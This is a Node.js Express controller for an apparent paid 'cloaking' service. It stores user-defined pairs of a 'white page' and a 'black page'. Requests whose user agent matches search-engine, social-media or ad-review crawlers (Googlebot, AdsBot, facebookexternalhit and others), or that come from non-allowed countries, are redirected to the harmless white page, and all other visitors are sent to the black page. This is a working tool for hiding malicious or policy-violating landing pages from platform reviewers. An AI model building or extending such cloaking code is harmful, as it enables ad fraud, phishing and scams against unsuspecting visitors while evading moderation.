import requestIp from 'request-ip';
import geoip from 'geoip-lite';
import { getCloaksByUserId, createNewCloak, removeCloak, getCloakByName } from '../dao/cloakDAO.js';
import { hasActiveSubscription } from '../dao/subscriptionDAO.js';

export const getCloaks = async (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ message: 'No autenticado' });
    }

    try {
        const userId = req.session.user.username;
        const cloaks = await getCloaksByUserId(userId);
        res.status(200).json(cloaks);
    } catch (error) {
        console.error('Error al obtener cloaks:', error);
        res.status(500).json({ message: 'Error al obtener cloaks' });
    }
};

export const createCloak = async (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ message: 'Not auth' });
    }

    const { name, whitePage, blackPage, allowedCountries, filteredBots } = req.body;

    if (!name || !whitePage || !blackPage) {
        return res.status(400).json({ message: 'Missing required data' });
    }

    try {
        const userId = req.session.user.username;

        const newCloak = {
            name,
            whitePage,
            blackPage,
            allowedCountries: allowedCountries || [],
            filteredBots: filteredBots || [],
            userId
        };



        const savedCloak = await createNewCloak(newCloak);
        res.status(201).json(savedCloak);
    } catch (error) {
        console.error('Error al crear cloak:', error);
        res.status(500).json({ message: 'Error al crear cloak' });
    }
};

export const deleteCloak = async (req, res) => {
    const { name } = req.params;
    const userId = req.session.user.username;

    try {
        await removeCloak(name, userId);
        res.status(200).json({ message: 'Cloak deleted successfully.' });
    } catch (error) {
        console.error('Error deleting cloak:', error);
        if (error.message.includes('Cloak not found')) {
            return res.status(404).json({ message: error.message });
        }
        res.status(500).json({ message: 'Server error.' });
    }
};

const botArrays = {
    google: ["googlebot", "adsbot-google", "googlebot-image", "googlebot-video", "googlesitemapgenerator", "google"],
    facebook: ["facebook", "facebot", "facebookexternalhit", "facebookcatalog"],
    twitter: ["twitterbot"],
    tiktok: ["tiktokbot"],
    bing: ["bingbot", "bingpreview"],
    yandex: ["yandexbot", "yandex"],
    whatsapp: ["whatsapp", "whatsappbot"],
    miscellaneous: [
        "kakaotalk-scrap",
        "worksogcrawler",
        "goscraper",
        "remindpreview",
        "wildlink_preview_bot",
        "pagebot",
        "crawler",
        "spider",
        "preview"
    ]
};

const countryCodes = {
    "Afghanistan": "AF", "Albania": "AL", "Algeria": "DZ", "Andorra": "AD", "Angola": "AO", "Antigua and Barbuda": "AG",
    "Argentina": "AR", "Armenia": "AM", "Australia": "AU", "Austria": "AT", "Azerbaijan": "AZ", "Bahamas": "BS",
    "Bahrain": "BH", "Bangladesh": "BD", "Barbados": "BB", "Belarus": "BY", "Belgium": "BE", "Belize": "BZ",
    "Benin": "BJ", "Bhutan": "BT", "Bolivia": "BO", "Bosnia and Herzegovina": "BA", "Botswana": "BW", "Brazil": "BR",
    "Brunei": "BN", "Bulgaria": "BG", "Burkina Faso": "BF", "Burundi": "BI", "Côte d'Ivoire": "CI", "Cabo Verde": "CV",
    "Cambodia": "KH", "Cameroon": "CM", "Canada": "CA", "Central African Republic": "CF", "Chad": "TD", "Chile": "CL",
    "China": "CN", "Colombia": "CO", "Comoros": "KM", "Congo": "CG", "Costa Rica": "CR", "Croatia": "HR", "Cuba": "CU",
    "Cyprus": "CY", "Czech Republic": "CZ", "Democratic Republic of the Congo": "CD", "Denmark": "DK", "Djibouti": "DJ",
    "Dominica": "DM", "Dominican Republic": "DO", "Ecuador": "EC", "Egypt": "EG", "El Salvador": "SV",
    "Equatorial Guinea": "GQ", "Eritrea": "ER", "Estonia": "EE", "Eswatini": "SZ", "Ethiopia": "ET", "Fiji": "FJ",
    "Finland": "FI", "France": "FR", "Gabon": "GA", "Gambia": "GM", "Georgia": "GE", "Germany": "DE", "Ghana": "GH",
    "Greece": "GR", "Grenada": "GD", "Guatemala": "GT", "Guinea": "GN", "Guinea-Bissau": "GW", "Guyana": "GY",
    "Haiti": "HT", "Holy See": "VA", "Honduras": "HN", "Hungary": "HU", "Iceland": "IS", "India": "IN", "Indonesia": "ID",
    "Iran": "IR", "Iraq": "IQ", "Ireland": "IE", "Israel": "IL", "Italy": "IT", "Jamaica": "JM", "Japan": "JP",
    "Jordan": "JO", "Kazakhstan": "KZ", "Kenya": "KE", "Kiribati": "KI", "Kuwait": "KW", "Kyrgyzstan": "KG",
    "Laos": "LA", "Latvia": "LV", "Lebanon": "LB", "Lesotho": "LS", "Liberia": "LR", "Libya": "LY", "Liechtenstein": "LI",
    "Lithuania": "LT", "Luxembourg": "LU", "Madagascar": "MG", "Malawi": "MW", "Malaysia": "MY", "Maldives": "MV",
    "Mali": "ML", "Malta": "MT", "Marshall Islands": "MH", "Mauritania": "MR", "Mauritius": "MU", "Mexico": "MX",
    "Micronesia": "FM", "Moldova": "MD", "Monaco": "MC", "Mongolia": "MN", "Montenegro": "ME", "Morocco": "MA",
    "Mozambique": "MZ", "Myanmar": "MM", "Namibia": "NA", "Nauru": "NR", "Nepal": "NP", "Netherlands": "NL",
    "New Zealand": "NZ", "Nicaragua": "NI", "Niger": "NE", "Nigeria": "NG", "North Korea": "KP", "North Macedonia": "MK",
    "Norway": "NO", "Oman": "OM", "Pakistan": "PK", "Palau": "PW", "Palestine State": "PS", "Panama": "PA",
    "Papua New Guinea": "PG", "Paraguay": "PY", "Peru": "PE", "Philippines": "PH", "Poland": "PL", "Portugal": "PT",
    "Qatar": "QA", "Romania": "RO", "Russia": "RU", "Rwanda": "RW", "Saint Kitts and Nevis": "KN", "Saint Lucia": "LC",
    "Saint Vincent and the Grenadines": "VC", "Samoa": "WS", "San Marino": "SM", "Sao Tome and Principe": "ST",
    "Saudi Arabia": "SA", "Senegal": "SN", "Serbia": "RS", "Seychelles": "SC", "Sierra Leone": "SL", "Singapore": "SG",
    "Slovakia": "SK", "Slovenia": "SI", "Solomon Islands": "SB", "Somalia": "SO", "South Africa": "ZA", "South Korea": "KR",
    "South Sudan": "SS", "Spain": "ES", "Sri Lanka": "LK", "Sudan": "SD", "Suriname": "SR", "Sweden": "SE",
    "Switzerland": "CH", "Syria": "SY", "Tajikistan": "TJ", "Tanzania": "TZ", "Thailand": "TH", "Timor-Leste": "TL",
    "Togo": "TG", "Tonga": "TO", "Trinidad and Tobago": "TT", "Tunisia": "TN", "Turkey": "TR", "Turkmenistan": "TM",
    "Tuvalu": "TV", "Uganda": "UG", "Ukraine": "UA", "United Arab Emirates": "AE", "United Kingdom": "GB",
    "United States of America": "US", "Uruguay": "UY", "Uzbekistan": "UZ", "Vanuatu": "VU", "Venezuela": "VE",
    "Vietnam": "VN", "Yemen": "YE", "Zambia": "ZM", "Zimbabwe": "ZW"
};

const getCountryCodesArray = countries => {
    let countriesCodesList = countries.map(country => countryCodes[country] || null).filter(code => code !== null);
    return countriesCodesList;
};

const groupBots = groupNames => {
    let combinedBots =
        [];

    groupNames.forEach(group => {
        const bots = botArrays[group] || [];
        combinedBots = combinedBots.concat(bots);
    });

    let misc = botArrays['miscellaneous'];
    combinedBots.concat(misc);

    return combinedBots;
}

export const processCloakingRedirect = async (req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    const clientIp = requestIp.getClientIp(req);
    const geo = geoip.lookup(clientIp);
    const name = req.params[0];
   
    try {
        const cloak = await getCloakByName(name);
        const activeSubscription = await hasActiveSubscription(cloak.userId);

        if (activeSubscription) {
            const botUserAgents = groupBots(cloak.filteredBots);
            const allowedCountries = getCountryCodesArray(cloak.allowedCountries);

            if (!cloak) {
                return res.status(404).send('Cloak not found');
            }

            if (botUserAgents.some(bot => userAgent.toLowerCase().includes(bot))) {
                return res.redirect(cloak.whitePage);
            }

            if (geo) {
                const country = geo.country;

                if (!allowedCountries.includes(country)) {
                    return res.redirect(cloak.whitePage);
                }
            }


            return res.redirect(cloak.blackPage);
        }
    } catch (error) {
        console.log('Cloak not found')
    }

    res.status(404).send(`404: Site not found or you don't have an active subscription. Please contact us.`);
}